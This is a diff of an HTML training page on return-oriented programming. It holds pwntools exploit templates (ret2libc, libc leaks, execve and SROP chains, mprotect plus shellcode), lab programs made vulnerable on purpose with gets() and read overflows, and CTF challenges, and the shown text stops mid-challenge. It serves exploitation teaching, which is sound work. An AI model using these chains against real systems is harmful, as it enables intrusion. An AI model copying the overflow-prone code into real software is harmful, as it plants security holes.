@@ -20,78 +20,1107 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <link rel="icon" type="image/x-icon" href="assets\images\hacker.jpg">
   <title>HackBook | ROP</title>
-  <!-- Bootstrap CSS -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
-  <!-- Bootstrap JS -->
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
-  <!-- Prism JS -->
   <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
-  <!-- <link rel="stylesheet" href="https://unpkg.com/dracula-prism/dist/css/dracula-prism.css"> -->
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-nasm.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
   <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
-  <!-- Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-    <script src="assets\scripts\main.js"></script>
-    <link rel="stylesheet" href="assets\styles\styles.css">
-
-
-    
-    
-  
+    <script src="assets/scripts/main.js"></script>
+    <link rel="stylesheet" href="assets/styles/styles.css">
 </head>
 <body>
 
-    <!-- Main Content -->
     <div class="content">
         <h1>Return Oriented Programming</h1>
         <hr>
-        <h2>Overview</h2>
-        <h3>Pwntools template</h3>
-        <hr>
-        <h2>ret2libc</h2>
-        <hr>
-        <h2 id="mprotect">mprotect</h2>
-        <hr>
-        When to use: 
-        <ul >
-            <li>&#9989; Statically linked (with <code>mprotect()</code>)</li>
-            <li>&#9989; NX Enabled</li>
-            <li>&#9989; Canary</li>
-            <li>&#10060; No PIE</li>
-            <li>&#9989; Arbitrary write</li>
-        </ul>
-        Example:
-        <pre><code class="language-py">#!/usr/bin/python3
+
+        <div class="tab-container">
+          <div class="tab-buttons">
+            <button class="tab-btn active" data-tab="notes">Notes</button>
+            <button class="tab-btn" data-tab="lab">Lab</button>
+            <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+          </div>
+
+          <!-- NOTES TAB -->
+          <div class="tab-content active" id="notes">
+            <h2>Core Concept</h2>
+            <p>ROP is the universal bypass for NX/DEP. Instead of injecting code, you chain snippets of <strong>existing</strong> code (gadgets) ending in <code>ret</code>.</p>
+
+<pre><code class="language-nasm">; Example gadgets:
+pop rdi; ret            ; load value from stack into RDI
+pop rsi; pop r15; ret   ; load two values from stack
+mov rdi, rsp; ret       ; set RDI to current stack pointer
+syscall; ret            ; make a system call</code></pre>
+
+            <h3>How Chains Work</h3>
+<pre><code class="language-nasm">Stack layout (RSP at top):
+┌─────────────────────┐ ← RSP
+│ addr of gadget_1     │ → pop rdi; ret
+├─────────────────────┤
+│ value for RDI        │ ← popped into RDI by gadget_1
+├─────────────────────┤
+│ addr of gadget_2     │ → pop rsi; pop r15; ret
+├─────────────────────┤
+│ value for RSI        │ ← popped into RSI
+├─────────────────────┤
+│ junk (for r15)       │ ← popped into R15 (don't care)
+├─────────────────────┤
+│ addr of system       │ → system(RDI) gets called
+└─────────────────────┘</code></pre>
+
+            <h2>Finding Gadgets</h2>
+<pre><code class="language-bash"># ROPgadget
+ROPgadget --binary ./binary | grep "pop rdi"
+ROPgadget --binary ./binary --ropchain     # auto-generate chain
+
+# ropper
+ropper -f ./binary --search "pop rdi"
+ropper -f ./binary --search "mov qword ptr"
+
+# pwntools
+rop = ROP(elf)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
+ret = rop.find_gadget(['ret']).address
+
+# In libc (much larger gadget set)
+ROPgadget --binary ./libc.so.6 | grep "pop rdi"</code></pre>
+
+            <h2>Common Gadget Patterns</h2>
+            <table>
+              <tr><th>Gadget</th><th>Purpose</th></tr>
+              <tr><td><code>pop rdi; ret</code></td><td>Set arg1 (most common)</td></tr>
+              <tr><td><code>pop rsi; pop r15; ret</code></td><td>Set arg2 (ignore r15)</td></tr>
+              <tr><td><code>pop rdx; ret</code></td><td>Set arg3 (rare in small binaries)</td></tr>
+              <tr><td><code>pop rax; ret</code></td><td>Set syscall number</td></tr>
+              <tr><td><code>syscall; ret</code></td><td>Execute syscall</td></tr>
+              <tr><td><code>pop rsp; ret</code></td><td>Stack pivot</td></tr>
+              <tr><td><code>leave; ret</code></td><td>Stack pivot (mov rsp, rbp; pop rbp)</td></tr>
+              <tr><td><code>mov [rdi], rsi; ret</code></td><td>Write-what-where</td></tr>
+              <tr><td><code>ret</code></td><td>Stack alignment (16-byte)</td></tr>
+            </table>
+
+            <h2>Classic ROP Chains</h2>
+            <h3>ret2libc: system("/bin/sh")</h3>
+<pre><code class="language-python">from pwn import *
+
+elf = ELF('./binary')
+libc = ELF('./libc.so.6')
+rop = ROP(elf)
+
+pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
+ret = rop.find_gadget(['ret']).address
+
+payload = flat(
+    b'A' * offset,
+    ret,                                     # 16-byte alignment
+    pop_rdi,
+    next(libc.search(b'/bin/sh\x00')),       # pointer to "/bin/sh"
+    libc.symbols['system'],
+)</code></pre>
+
+            <h3>ret2plt Libc Leak + Return to Main</h3>
+<pre><code class="language-python"># Stage 1: Leak libc via puts@plt(GOT[puts])
+payload1 = flat(
+    b'A' * offset,
+    pop_rdi,
+    elf.got['puts'],       # address stored in GOT
+    elf.plt['puts'],       # calls puts() with GOT entry as arg
+    elf.symbols['main'],   # return to main for stage 2
+)
+p.sendline(payload1)
+
+# Parse leaked address
+leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
+libc.address = leaked - libc.symbols['puts']
+
+# Stage 2: system("/bin/sh") with known libc base
+payload2 = flat(
+    b'A' * offset,
+    ret,
+    pop_rdi,
+    next(libc.search(b'/bin/sh\x00')),
+    libc.symbols['system'],
+)
+p.sendline(payload2)</code></pre>
+
+            <h3>Syscall Chain: execve("/bin/sh", NULL, NULL)</h3>
+<pre><code class="language-python"># For statically linked binaries or when you have syscall gadgets
+# execve syscall number = 59 (0x3b)
+
+# Need: pop rax, pop rdi, pop rsi, pop rdx, syscall
+# Also need "/bin/sh" somewhere writable
+
+# Write "/bin/sh" to bss using write-what-where gadgets
+# Then:
+payload = flat(
+    b'A' * offset,
+    pop_rax, 59,                   # rax = 59 (execve)
+    pop_rdi, bss_binsh_addr,       # rdi = "/bin/sh"
+    pop_rsi, 0,                    # rsi = NULL (argv)
+    pop_rdx, 0,                    # rdx = NULL (envp)
+    syscall_ret,                   # syscall
+)</code></pre>
+
+            <h2 id="mprotect">mprotect ROP Chain</h2>
+            <p>When to use:</p>
+            <ul>
+                <li>&#9989; Statically linked (with <code>mprotect()</code>)</li>
+                <li>&#9989; NX Enabled</li>
+                <li>&#10060; No PIE</li>
+                <li>&#9989; Arbitrary write or can read shellcode to bss</li>
+            </ul>
+<pre><code class="language-python">#!/usr/bin/python3
 from pwn import *
-import warnings
-import os
-warnings.filterwarnings('ignore')
 context.arch = 'amd64'
-context.log_level = 'critical'
 
 binary = "./vulnerable"
 elf = ELF(binary)
 rop = ROP(elf)
 
-# mprotect the bss to make it executable
-# int mprotect(void addr[.size], size_t size, int prot);
+# mprotect(bss_page, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)
+payload = b'A' * offset
 payload += p64(rop.rdi[0])
-payload += p64(elf.bss())   # addr = &bss
+payload += p64(elf.bss() &amp; ~0xfff)  # page-aligned bss address
 payload += p64(rop.rsi[0])
-payload += p64(0x1000)      # size = page size
+payload += p64(0x1000)               # size = page size
 payload += p64(rop.rdx[0])
-payload += p64(0x7)         # prot = PROT_READ | PROT_WRITE | PROT_EXEC
-payload += p64(elf.sym.mprotect)    # mprotect must be statically linked
+payload += p64(0x7)                  # PROT_READ | PROT_WRITE | PROT_EXEC
+payload += p64(elf.sym.mprotect)
 
-# run shellcode
-off = 0x200     # bss offset where the shellcode will be
-payload += p64(e.bss(off + 1))
+# Jump to shellcode in bss
+off = 0x200
+payload += p64(elf.bss(off))
 
 with process(binary) as r:
     r.send(payload)
     r.sendline(asm(shellcraft.sh()))
-    print("Starting shell")
     r.interactive()</code></pre>
+
+            <h2>Stack Pivot</h2>
+<pre><code class="language-python"># When the overflow is too small for a full ROP chain:
+# Pivot the stack to a controlled buffer (bss, heap, etc.)
+
+# Method 1: pop rsp; ret
+payload = b'A' * offset
+payload += p64(pop_rsp)
+payload += p64(controlled_buffer)   # RSP now points here
+# Execution continues from the ROP chain at controlled_buffer
+
+# Method 2: leave; ret (mov rsp, rbp; pop rbp; ret)
+# Control RBP via overflow, then use leave;ret
+payload = b'A' * buf_size
+payload += p64(controlled_buffer)   # overwrite saved RBP
+payload += p64(leave_ret)           # leave: RSP = RBP; pop RBP
+# RSP now points to controlled_buffer + 8</code></pre>
+
+            <h2>SIGROP (Sigreturn-Oriented Programming)</h2>
+<pre><code class="language-python"># Uses sigreturn syscall to set ALL registers at once
+# Requires: syscall gadget, sigreturn frame on stack
+from pwn import *
+
+frame = SigreturnFrame()
+frame.rax = 59                            # execve
+frame.rdi = bss_binsh                     # "/bin/sh"
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = syscall_addr
+frame.rsp = 0xdeadbeef                    # doesn't matter
+
+payload = b'A' * offset
+payload += p64(pop_rax) + p64(15)         # rax = 15 (sigreturn)
+payload += p64(syscall_addr)
+payload += bytes(frame)</code></pre>
+          </div>
+
+          <!-- LAB TAB -->
+          <div class="tab-content" id="lab">
+            <h2>Labs</h2>
+
+            <div class="lab-card">
+              <h4>Lab 1: Basic ROP — ret2win with Gadgets</h4>
+              <span class="difficulty difficulty-easy">Easy</span>
+              <p class="objective">Objective: Use a pop rdi gadget to pass an argument to a function.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// rop1.c - gcc -o rop1 rop1.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win(int arg) {
+    if (arg == 0xdeadbeef) {
+        system("/bin/sh");
+    } else {
+        printf("Wrong arg: 0x%x\n", arg);
+    }
+}
+
+void vuln() {
+    char buf[64];
+    printf("ROP me: ");
+    gets(buf);
+}
+
+int main() { vuln(); }</code></pre>
+                <p><strong>Task:</strong> You can't just jump to win() — you need to set RDI = 0xdeadbeef first. Use ROPgadget to find <code>pop rdi; ret</code> and build a chain.</p>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 2: ret2libc — Leak + Shell</h4>
+              <span class="difficulty difficulty-medium">Medium</span>
+              <p class="objective">Objective: Perform a two-stage exploit: leak libc, return to main, call system("/bin/sh").</p>
+              <div class="setup-code">
+<pre><code class="language-c">// rop2.c - gcc -o rop2 rop2.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void vuln() {
+    char buf[64];
+    printf(">> ");
+    gets(buf);
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    vuln();
+    return 0;
+}</code></pre>
+                <p><strong>Steps:</strong></p>
+                <ol>
+                  <li>Stage 1: Use puts@plt to leak puts@GOT → libc address</li>
+                  <li>Return to main for a second overflow</li>
+                  <li>Calculate libc base from leak</li>
+                  <li>Stage 2: Call system("/bin/sh") with correct libc addresses</li>
+                  <li>Remember stack alignment!</li>
+                </ol>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 3: Syscall ROP Chain</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">Objective: Build a syscall-based ROP chain on a statically linked binary.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// rop3.c - gcc -o rop3 rop3.c -static -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void vuln() {
+    char buf[128];
+    printf("Static ROP: ");
+    read(0, buf, 512);
+}
+
+int main() {
+    vuln();
+    return 0;
+}</code></pre>
+                <p><strong>Task:</strong> No libc to leak (statically linked). Find gadgets for: pop rax, pop rdi, pop rsi, pop rdx, syscall. Write "/bin/sh" to bss, then execve it. Use <code>ROPgadget --binary rop3 --ropchain</code> for a head start.</p>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 4: Stack Pivot</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">Objective: Exploit a tiny overflow by pivoting the stack to a larger controlled buffer.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// rop4.c - gcc -o rop4 rop4.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+char pivot_buf[0x1000];  // bss - known address
+
+void vuln() {
+    char tiny[8];  // only enough for 1-2 gadgets after overflow
+    printf("tiny> ");
+    read(0, tiny, 24);  // 8 + rbp + ret = can overflow ret only
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    printf("pivot_buf: %p\n", pivot_buf);
+    printf("Load payload to pivot_buf:\n");
+    read(0, pivot_buf, 0x1000);
+    vuln();
+    return 0;
+}</code></pre>
+                <p><strong>Task:</strong> The overflow in vuln() only gives you 1 gadget. Write a full ROP chain to pivot_buf first, then pivot RSP there using <code>leave; ret</code> or <code>pop rsp; ret</code>.</p>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 5: ret2libc with Versioned Libc</h4>
+              <span class="difficulty difficulty-medium">Medium</span>
+              <p class="objective">Objective: Identify the remote libc version from a leak and use the correct offsets to get a shell.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// rop5.c - gcc -o rop5 rop5.c -fno-stack-protector -no-pie
+// Deploy with: LD_PRELOAD=./libc-2.31.so ./rop5
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void vuln() {
+    char buf[80];
+    printf("version> ");
+    gets(buf);
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    vuln();
+    return 0;
+}</code></pre>
+                <p><strong>Task:</strong> Leak two GOT entries (puts + setvbuf) to fingerprint the exact libc version. Use <a href="https://libc.blukat.me/">libc.blukat.me</a> or <code>libc-database</code> to match the offsets. Download the matching libc, then complete a ret2libc attack. Test with at least two different libc versions (e.g., 2.31 vs 2.35) — note how offsets and available one_gadgets change.</p>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 6: ret2csu — __libc_csu_init Gadget</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">Objective: Use the universal __libc_csu_init gadgets to control RDX and call a function with three arguments.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// rop6.c - gcc -o rop6 rop6.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win(long a, long b, long c) {
+    if (a == 0x1337 &amp;&amp; b == 0xdead &amp;&amp; c == 0xbeef) {
+        system("/bin/sh");
+    }
+}
+
+void vuln() {
+    char buf[64];
+    printf("csu> ");
+    gets(buf);
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    vuln();
+    return 0;
+}</code></pre>
+                <p><strong>Task:</strong> There is no <code>pop rdx; ret</code> gadget in this binary. Use the two gadgets in <code>__libc_csu_init</code>: the "pop" gadget (pop rbx, rbp, r12, r13, r14, r15; ret) and the "call" gadget (mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]). Set all three args and call win().</p>
+<pre><code class="language-python"># Skeleton
+csu_pop = elf.sym['__libc_csu_init'] + 0x5a  # pop rbx..r15; ret
+csu_call = elf.sym['__libc_csu_init'] + 0x40 # mov rdx,r14; mov rsi,r13; call [r15+rbx*8]
+
+payload = flat(
+    b'A' * offset,
+    csu_pop,
+    0,              # rbx = 0
+    1,              # rbp = 1 (rbx+1 == rbp to skip jne)
+    0x1337,         # r12 → edi (arg1, truncated to 32-bit)
+    0xdead,         # r13 → rsi (arg2)
+    0xbeef,         # r14 → rdx (arg3)
+    elf.got['win'], # r15 → call [r15 + rbx*8]
+    csu_call,
+    # 7 pops follow (add rsp,8 + 6 pops), then ret
+    b'A' * 56,
+    elf.sym['win'], # or next gadget
+)</code></pre>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 7: SROP — Sigreturn-Oriented Programming</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">Objective: Craft a SigreturnFrame to call execve and get a shell on a minimal binary.</p>
+              <div class="setup-code">
+<pre><code class="language-nasm">; rop7.asm - nasm -f elf64 rop7.asm &amp;&amp; ld -o rop7 rop7.o
+; Minimal binary: only read() and syscall available
+section .text
+global _start
+
+_start:
+    ; read(0, rsp, 0x400)
+    xor eax, eax          ; syscall 0 = read
+    xor edi, edi          ; fd = 0 (stdin)
+    mov rsi, rsp          ; buf = rsp
+    mov edx, 0x400        ; count
+    syscall
+    ret                   ; pivot into our input
+
+section .data
+    binsh db "/bin/sh", 0</code></pre>
+                <p><strong>Task:</strong> Build a SigreturnFrame using pwntools. The chain: write address of <code>pop rax; ret</code> → 15 (rt_sigreturn) → <code>syscall</code> address → SigreturnFrame bytes. The frame sets RAX=59, RDI=addr_of_binsh, RSI=0, RDX=0, RIP=syscall_addr. Note: the "syscall; ret" at _start IS your syscall gadget.</p>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 8: mprotect + Shellcode Execution</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">Objective: Use ROP to call mprotect() making a memory region executable, then jump to injected shellcode.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// rop8.c - gcc -o rop8 rop8.c -static -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+
+char staging[0x2000];  // bss buffer for shellcode
+
+void vuln() {
+    char buf[64];
+    printf("shellcode> ");
+    read(0, staging, 0x200);   // read shellcode to staging
+    printf("rop> ");
+    read(0, buf, 0x200);       // overflow for ROP chain
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    printf("staging @ %p\n", staging);
+    vuln();
+    return 0;
+}</code></pre>
+                <p><strong>Task:</strong> Build a ROP chain that calls <code>mprotect(staging_page, 0x1000, 7)</code> (PROT_READ|PROT_WRITE|PROT_EXEC), then jumps to staging. First send shellcode (e.g., <code>shellcraft.sh()</code>), then send the ROP chain. Remember to page-align the address: <code>staging &amp; ~0xfff</code>.</p>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 9: Write-What-Where via ROP</h4>
+              <span class="difficulty difficulty-medium">Medium</span>
+              <p class="objective">Objective: Use ROP gadgets to write arbitrary data to a known address (.bss), then use it in a function call.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// rop9.c - gcc -o rop9 rop9.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void exec_cmd(const char *cmd) {
+    system(cmd);
+}
+
+void vuln() {
+    char buf[64];
+    printf("www> ");
+    gets(buf);
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    vuln();
+    return 0;
+}</code></pre>
+                <p><strong>Task:</strong> There's no "/bin/sh" string in the binary. Use write-what-where gadgets to write it to .bss:</p>
+<pre><code class="language-python"># Find: mov [rdi], rsi; ret  OR  mov qword ptr [rax], rdx; ret
+# Strategy:
+# 1. pop rdi → bss_addr
+# 2. pop rsi → 0x68732f6e69622f ("/bin/sh\0" as u64)
+# 3. mov [rdi], rsi; ret → writes string to bss
+# 4. pop rdi → bss_addr
+# 5. call exec_cmd → system("/bin/sh")</code></pre>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 10: ROP with Limited Gadgets</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">Objective: Build an execve ROP chain using only unconventional gadgets — no direct pop rdi/rsi/rdx.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// rop10.c - gcc -o rop10 rop10.c -fno-stack-protector -no-pie -static
+// Strip common gadgets by hand or use a custom minimal binary
+#include &lt;stdio.h&gt;
+
+// Available gadgets (verified with ROPgadget):
+//   xchg rax, rdi; ret
+//   pop rax; ret
+//   mov rsi, rax; ret
+//   xor edx, edx; ret
+//   syscall; ret
+//   mov [rax], rsi; ret
+
+void vuln() {
+    char buf[96];
+    printf("limited> ");
+    read(0, buf, 0x200);
+}
+
+int main() { vuln(); return 0; }</code></pre>
+                <p><strong>Task:</strong> With no <code>pop rdi; ret</code>, you must use indirect paths. Example chain to set RDI:</p>
+<pre><code class="language-python"># pop rax → value → xchg rax, rdi; ret  ← now RDI = value
+# pop rax → bss_addr → mov rsi, rax → pop rax → "/bin/sh" as u64
+#   → but wait, no mov [rax], rsi... need to be creative
+# Think about what gadgets can be COMBINED to achieve the effect</code></pre>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 11: PIE + ASLR — Full Bypass ROP</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">Objective: Defeat PIE and ASLR by leaking both a binary address and a libc address, then ROP to shell.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// rop11.c - gcc -o rop11 rop11.c -fno-stack-protector -pie
+#include &lt;stdio.h&gt;
+
+void vuln() {
+    char buf[64];
+    printf("buf @ %p\n", buf);  // leaks a stack address (PIE clue)
+    printf("pie> ");
+    read(0, buf, 0x200);
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    vuln();
+    return 0;
+}</code></pre>
+                <p><strong>Task:</strong> With PIE enabled, all binary addresses are randomized. Steps:</p>
+                <ol>
+                  <li>Parse the stack leak to calculate the binary base (stack addr → saved RIP on stack → binary base)</li>
+                  <li>Use partial overwrite or calculated offsets to redirect to a puts@plt leak</li>
+                  <li>Leak a GOT entry to determine libc base</li>
+                  <li>Return to vuln() for a final payload with libc ROP chain</li>
+                </ol>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 12: xchg-Based Stack Pivot</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">Objective: Use an <code>xchg rax, rsp; ret</code> gadget to pivot the stack to a heap-allocated buffer.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// rop12.c - gcc -o rop12 rop12.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void vuln() {
+    char *heap_buf = malloc(0x1000);
+    char stack_buf[16];
+
+    printf("heap_buf @ %p\n", heap_buf);
+
+    printf("payload> ");
+    read(0, heap_buf, 0x1000);    // large payload on heap
+
+    printf("trigger> ");
+    read(0, stack_buf, 40);        // small overflow on stack
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    vuln();
+    return 0;
+}</code></pre>
+                <p><strong>Task:</strong> The stack overflow is only 24 bytes past the buffer — room for RBP + 1 gadget. Use the following pivot strategy:</p>
+<pre><code class="language-python"># Stage 1: Write full ROP chain to heap_buf
+# Stage 2: Overflow stack_buf:
+#   padding + pop_rax + heap_buf_addr + xchg_rax_rsp_ret
+# The xchg swaps RAX (heap_buf) with RSP → execution continues from heap
+# Full ROP chain on heap: ret2libc, execve, etc.</code></pre>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 13: Automatic ROP Chain Generation</h4>
+              <span class="difficulty difficulty-easy">Easy</span>
+              <p class="objective">Objective: Use automated tools (ROPgadget, pwntools ROP) to generate exploit chains without manual gadget hunting.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// rop13.c - gcc -o rop13 rop13.c -static -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+
+void vuln() {
+    char buf[128];
+    printf("auto> ");
+    read(0, buf, 0x400);
+}
+
+int main() { vuln(); return 0; }</code></pre>
+                <p><strong>Task:</strong> Generate a shell using three different automated approaches and compare:</p>
+<pre><code class="language-bash"># Method 1: ROPgadget auto-chain
+ROPgadget --binary rop13 --ropchain
+
+# Method 2: ropper
+ropper -f rop13 --chain execve
+
+# Method 3: pwntools ROP object
+</code></pre>
+<pre><code class="language-python"># pwntools auto ROP
+from pwn import *
+elf = ELF('./rop13')
+rop = ROP(elf)
+rop.execve(next(elf.search(b'/bin/sh\x00')), 0, 0)
+print(rop.dump())  # inspect the generated chain
+payload = b'A' * offset + rop.chain()</code></pre>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 14: ret2dlresolve</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">Objective: Abuse the dynamic linker's lazy binding to call system() without leaking libc — forge a fake relocation entry.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// rop14.c - gcc -o rop14 rop14.c -fno-stack-protector -no-pie -m32
+// Note: 32-bit for simpler dl-resolve structures
+#include &lt;stdio.h&gt;
+
+void vuln() {
+    char buf[64];
+    printf("dlresolve> ");
+    read(0, buf, 0x200);
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    vuln();
+    return 0;
+}</code></pre>
+                <p><strong>Task:</strong> Instead of leaking libc, forge fake ELF structures in .bss and call <code>_dl_runtime_resolve</code> with a crafted reloc_index that resolves "system". Use pwntools <code>Ret2dlresolvePayload</code>:</p>
+<pre><code class="language-python">from pwn import *
+elf = ELF('./rop14')
+rop = ROP(elf)
+dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
+rop.read(0, dlresolve.data_addr)   # read fake structs to bss
+rop.ret2dlresolve(dlresolve)       # trigger resolution
+payload = b'A' * offset + rop.chain()
+# Send payload, then send dlresolve.payload (the fake structs)</code></pre>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 15: 32-bit ROP Fundamentals</h4>
+              <span class="difficulty difficulty-easy">Easy</span>
+              <p class="objective">Objective: Build a ret2libc ROP chain on a 32-bit binary where arguments are passed on the stack, not in registers.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// rop15.c - gcc -m32 -o rop15 rop15.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void vuln() {
+    char buf[64];
+    printf("x86> ");
+    gets(buf);
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    vuln();
+    return 0;
+}</code></pre>
+                <p><strong>Task:</strong> In 32-bit, arguments go on the stack after the return address — no gadgets needed for simple calls:</p>
+<pre><code class="language-python"># 32-bit ret2libc layout:
+# [padding] [system@plt] [exit@plt] [addr of "/bin/sh"]
+#                          ↑ fake return     ↑ arg1 to system()
+# Compare this to 64-bit where you need pop rdi; ret
+# Leak libc via puts@plt(GOT[puts]) → return to main → system("/bin/sh")</code></pre>
+              </div>
+            </div>
+
+            <div class="lab-card">
+              <h4>Lab 16: Sigreturn Frame Crafting — Multi-Syscall</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">Objective: Chain multiple sigreturn frames to first mmap an RWX region, then read shellcode into it, then jump to it.</p>
+              <div class="setup-code">
+<pre><code class="language-nasm">; rop16.asm - nasm -f elf64 rop16.asm &amp;&amp; ld -o rop16 rop16.o
+section .text
+global _start
+
+_start:
+    xor eax, eax
+    xor edi, edi
+    mov rsi, rsp
+    mov edx, 0x800
+    syscall          ; read(0, rsp, 0x800)
+    ret
+
+gadget:
+    pop rax
+    ret
+
+do_syscall:
+    syscall
+    ret</code></pre>
+                <p><strong>Task:</strong> Use three chained SROP frames. Frame 1: mmap(0x1337000, 0x1000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) with RSP set to land on Frame 2. Frame 2: read(0, 0x1337000, 0x200) with RSP landing on Frame 3. Frame 3: set RIP = 0x1337000 to jump to shellcode. Each frame's RSP must point to the next <code>pop rax; 15; syscall</code> sequence.</p>
+<pre><code class="language-python">frame1 = SigreturnFrame()
+frame1.rax = 9         # mmap
+frame1.rdi = 0x1337000
+frame1.rsi = 0x1000
+frame1.rdx = 7         # RWX
+frame1.r10 = 0x22      # MAP_PRIVATE | MAP_ANONYMOUS
+frame1.r8 = 0xffffffffffffffff  # fd = -1
+frame1.r9 = 0
+frame1.rip = syscall_addr
+frame1.rsp = addr_of_frame2_trigger  # chain to next frame</code></pre>
+              </div>
+            </div>
+          </div>
+
+          <!-- CTF TAB -->
+          <div class="tab-content" id="ctf">
+            <h2>CTF Challenges</h2>
+
+            <div class="ctf-card">
+              <h4>Challenge 1: ROPchain 101</h4>
+              <span class="difficulty difficulty-easy">Easy</span>
+              <p class="objective">A binary has a function that opens a file, but it needs two arguments set correctly via ROP.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// ropctf1.c - gcc -o ropctf1 ropctf1.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void print_flag(long magic1, long magic2) {
+    if (magic1 == 0xcafebabe &amp;&amp; magic2 == 0xd00dface) {
+        system("cat flag.txt");
+    }
+}
+
+int main() {
+    char buf[48];
+    printf("Challenge: ");
+    gets(buf);
+    return 0;
+}</code></pre>
+              </div>
+              <button class="hint-toggle">Show Hint</button>
+              <div class="hint-content">
+                <p>Need two arguments: find <code>pop rdi; ret</code> and <code>pop rsi; pop r15; ret</code> (or just <code>pop rsi; ret</code>). Chain: padding + pop_rdi + 0xcafebabe + pop_rsi_r15 + 0xd00dface + junk + print_flag.</p>
+              </div>
+            </div>
+
+            <div class="ctf-card">
+              <h4>Challenge 2: Leaky Pipes</h4>
+              <span class="difficulty difficulty-medium">Medium</span>
+              <p class="objective">No win function. Leak libc and call system. The binary has puts and a buffer overflow.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// ropctf2.c - gcc -o ropctf2 ropctf2.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+
+void feedback() {
